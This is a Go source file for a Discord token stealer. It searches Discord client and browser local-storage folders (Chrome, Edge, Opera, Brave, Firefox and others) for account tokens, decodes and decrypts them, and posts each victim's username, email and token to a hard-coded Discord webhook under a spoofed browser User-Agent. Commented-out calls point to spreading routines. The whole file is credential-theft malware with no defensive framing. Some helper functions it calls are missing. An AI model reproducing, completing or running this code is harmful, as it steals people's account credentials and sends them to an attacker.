package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/fs"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"golang.org/x/exp/slices"
)

var tokens []string

const (
	WehookUrl = "https://discord.com/api/webhooks/1017841380824989746/RE5eOZAZWSs7qU0AkuxY9kbYxqFUXHgcqJALVRNYBTEOFk8N3CLwVK7KVDrO435HX_lS"
)

func main() {
	start()
	send_info()
	// go spred()
	// go block_dc()

}

func send_info() {
	for _, token := range tokens {
		json, err := get_token_info(token)
		if err {
			fmt.Print(err)
			continue
		}
		text := "Username: " + getJsonValue("username", json) + "#" + getJsonValue("discriminator", json) + "\n" + "Email: " + getJsonValue("email", json) + "\n" + "Token: " + token
		jsonData := []byte(`{"content": ` + text + `}`)
		req, _ := http.NewRequest("POST", "https://discord.com/api/webhooks/1017841380824989746/RE5eOZAZWSs7qU0AkuxY9kbYxqFUXHgcqJALVRNYBTEOFk8N3CLwVK7KVDrO435HX_lS", bytes.NewBuffer(jsonData))
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74")
		req.Header.Set("Content-Type", "application/json; charset=UTF-8")
		cl := &http.Client{}
		res, _ := cl.Do(req)
		defer req.Body.Close()

		fmt.Println(res)
	}

}

func start() {
	appdata, _ := os.UserConfigDir()
	localappdata, _ := os.UserCacheDir()
	locations := []string{}

	// Token locations
	locations = append(locations, appdata+"\\discord\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\discordcanary\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\discordptb\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\Lightcord\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\Mozilla\\Firefox\\Profiles")
	locations = append(locations, localappdata+"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\Yandex\\YandexBrowser\\User Data\\Default")
	locations = append(locations, localappdata+"\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Default")
	locations = append(locations, localappdata+"\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\")

	for _, location := range locations {
		if _, err := os.Stat(location); os.IsNotExist(err) {
			continue
		}
		if strings.Contains(location, "Mozilla") {
			for _, filepath := range get_files(location, ".sqlite") {
				r := regexp.MustCompile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}")
				file, _ := os.Open(filepath)
				data, _ := ioutil.ReadAll(file)
				for _, match := range r.FindAllStringSubmatch(string(data), -1) {
					tokens = append(tokens, match...)

				}
			}
		}
		if strings.Contains(location, "cord") {
			for _, filepath := range get_files(location, ".ldb") {
				r := regexp.MustCompile("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)")
				file, _ := os.Open(filepath)
				data, _ := ioutil.ReadAll(file)
				for _, match := range r.FindAllString(string(data), -1) {
					baseToken := strings.SplitAfterN(string(match), "dQw4w9WgXcQ:", 2)[1]
					tokenEnc, _ := base64.StdEncoding.DecodeString(baseToken)
					token, _ := decryptToken(tokenEnc)
					_, val := get_token_info(token)
					if !val {
						continue
					}

					if !slices.Contains(tokens, string(token)) {
						tokens = append(tokens, string(token))

					}
				}
			}
		}

	}
	fmt.Println(tokens)

}

func get_files(root, ext string) []string {
	var a []string
	filepath.WalkDir(root, func(s string, d fs.DirEntry, e error) error {
		if e != nil {
			return e
		}
		if filepath.Ext(d.Name()) == ext {
			a = append(a, s)
		}
		return nil
	})
	return a
}
func getJsonValue(key string, jsonData string) (value string) {

	var result map[string]interface{}

	err := json.Unmarshal([]byte(jsonData), &result)
	if err != nil {
		return "Unknown"
	}

	value = fmt.Sprintf("%v", result[key])
	return
}
